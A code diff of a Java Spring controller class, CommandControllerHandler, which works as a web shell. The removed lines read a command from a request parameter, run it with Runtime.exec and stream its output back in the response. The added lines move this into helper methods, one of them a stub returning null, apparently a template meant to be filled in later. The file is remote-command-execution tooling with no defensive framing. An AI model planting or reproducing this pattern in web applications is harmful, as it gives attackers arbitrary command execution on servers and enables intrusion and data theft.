@@ -15,16 +15,11 @@ import java.io.InputStream;
 public class CommandControllerHandler implements Controller {
     public static String paramName;
 
-
-    public CommandControllerHandler() {
-    }
-
     public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
         try {
-            String cmd = request.getParameter(paramName);
-            if (cmd != null) {
-                Process exec = Runtime.getRuntime().exec(cmd);
-                InputStream inputStream = exec.getInputStream();
+            String param = getParam(request.getParameter(paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = response.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -32,9 +27,17 @@ public class CommandControllerHandler implements Controller {
                     outputStream.write(buf, 0, length);
                 }
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
+        return null;
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
         return null;
     }
 }
